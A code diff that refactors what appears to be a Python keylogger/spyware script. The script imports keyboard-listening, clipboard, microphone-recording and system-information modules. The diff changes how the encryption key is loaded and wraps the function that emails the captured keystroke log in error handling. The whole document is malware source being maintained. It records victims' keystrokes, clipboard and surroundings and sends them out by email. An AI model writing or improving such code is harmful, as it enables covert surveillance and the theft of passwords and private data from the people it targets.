@@ -8,8 +8,6 @@ import smtplib
 import socket
 import platform
 
-from Cryptography import generateKey
-
 import win32clipboard
 
 from pynput.keyboard import Key, Listener
@@ -20,6 +18,8 @@ import os
 from scipy.io.wavfile import write
 
 from cryptography.fernet import Fernet
+
+from Cryptography.generateKey import get_or_create_key
 
 import getpass
 from requests import get
@@ -35,11 +35,10 @@ key_information_e = "e_key_information.txt"
 system_information_e = "e_system_info.txt"
 clipboard_information_e = "e_clipboard.txt"
 
-
 file_merge = os.path.join(os.getcwd(), "Project")
 
-with open("Cryptography/encryption_key.txt", "rb") as f:
-    key = f.read()
+key = get_or_create_key()
+fernet = Fernet(key)
 
 count = 0
 keys = []
@@ -92,8 +91,11 @@ def send_email(filename, attachment, toaddr):
 
     s.quit()
 
-send_email(key_information, attachment, toaddr)
 
+try:
+    send_email(key_information, attachment, toaddr)
+except Exception as e:
+    print("Email failed:", e)
 
 #PC Information
 
